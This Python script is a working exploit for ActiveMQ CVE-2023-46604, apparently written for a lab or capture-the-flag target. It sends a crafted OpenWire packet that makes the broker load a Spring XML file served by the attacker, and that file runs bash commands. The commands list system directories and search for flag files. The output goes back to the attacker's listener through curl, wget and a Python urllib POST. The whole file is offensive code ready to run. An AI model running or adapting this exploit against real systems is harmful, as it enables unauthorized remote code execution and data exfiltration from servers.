#!/usr/bin/env python3
"""ActiveMQ CVE-2023-46604 - diagnostic multi-channel exfil."""
import argparse, html, http.server, socket, threading

p = argparse.ArgumentParser()
p.add_argument("--target", default="172.28.9.3")
p.add_argument("--port", type=int, default=61616)
p.add_argument("--lport", type=int, default=8001)
p.add_argument("--wait", type=int, default=45)
a = p.parse_args()
TARGET, TPORT, LPORT = a.target, a.port, a.lport

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((TARGET, TPORT)); OUR_IP = s.getsockname()[0]; s.close()
print("[*] callback:", OUR_IP, LPORT)

INNER = "id; hostname; ls -la /; echo ===; ls -la /opt 2>&1; echo ===; ls -la /opt/activemq 2>&1; echo ===; find / -maxdepth 4 -iname '*flag*' 2>&1 | head"

pycode = ("import urllib.request,subprocess;"
          "urllib.request.urlopen(urllib.request.Request('http://%s:%d/exfil-py',"
          "data=subprocess.getoutput(%r).encode()),timeout=10)"
          % (OUR_IP, LPORT, INNER))
SCRIPT = ("curl -s -m 5 --data-binary \"$(%s)\" http://%s:%d/exfil-curl || true\n"
          "python3 -c \"%s\" || true\n"
          "wget -q -O /dev/null \"http://%s:%d/ping-wget\" || true\n"
          % (INNER, OUR_IP, LPORT, pycode, OUR_IP, LPORT))

XML = ('<beans xmlns="http://www.springframework.org/schema/beans" '
       'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
       'xsi:schemaLocation="http://www.springframework.org/schema/beans '
       'http://www.springframework.org/schema/beans/spring-beans.xsd">'
       '<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">'
       '<constructor-arg><list><value>bash</value><value>-c</value>'
       '<value>' + html.escape(SCRIPT) + '</value></list></constructor-arg></bean></beans>')

got = threading.Event()


class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/poc.xml"):
            print("[+] poc fetched", flush=True)
            d = XML.encode()
            self.send_response(200); self.send_header("Content-Type", "application/xml")
            self.send_header("Content-Length", str(len(d))); self.end_headers()
            self.wfile.write(d)
        else:
            print("[+] GET", self.path, flush=True)
            self.send_response(200); self.end_headers()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0"))
        data = self.rfile.read(n).decode(errors="replace")
        print("\n[+] EXFIL path=%s\n%s\n" % (self.path, data), flush=True)
        got.set()
        self.send_response(200); self.end_headers()

    def log_message(self, *x):
        pass


def ps(v):
    r = v.encode(); return len(r).to_bytes(2, "big") + r


def mk(url):
    cls = "org.springframework.context.support.ClassPathXmlApplicationContext"
    body = bytes.fromhex("1f00000000000000000001") + b"\x01" + ps(cls) + b"\x01" + ps(url)
    return len(body).to_bytes(4, "big") + body


srv = http.server.ThreadingHTTPServer(("0.0.0.0", LPORT), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()

url = "http://%s:%d/poc.xml" % (OUR_IP, LPORT)
with socket.create_connection((TARGET, TPORT), timeout=10) as c:
    c.sendall(mk(url))
print("[+] sent")
if not got.wait(a.wait):
    print("[-] no exfil callback")
srv.shutdown()
